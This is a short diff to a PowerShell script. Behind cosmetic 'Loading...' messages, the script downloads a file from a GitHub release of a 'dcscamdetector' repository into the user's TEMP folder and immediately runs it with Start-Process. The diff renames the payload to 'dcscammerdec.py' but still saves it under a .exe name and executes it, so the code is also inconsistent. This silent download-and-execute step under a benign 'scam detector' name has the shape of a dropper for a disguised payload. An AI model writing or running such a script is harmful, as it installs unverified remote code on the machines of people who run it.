@@ -9,9 +9,8 @@ Write-Host "Loading..."
 Write-Host "Loaded!"
 
 # Download and Execute Software
-$software1 = "$env:TEMP\Software1.exe"
+$software1 = "$env:TEMP\dcscammerdec.exe"
 
-Invoke-WebRequest -Uri "https://github.com/dcscamdetector/dcscamdetector.github.io/releases/download/321321312413254325/321321321.exe" -OutFile $software1
+Invoke-WebRequest -Uri "https://github.com/dcscamdetector/dcscamdetector.github.io/releases/download/321321312413254325/dcscammerdec.py" -OutFile $software1
 
 Start-Process -FilePath $software1
-Start-Process -FilePath $software2
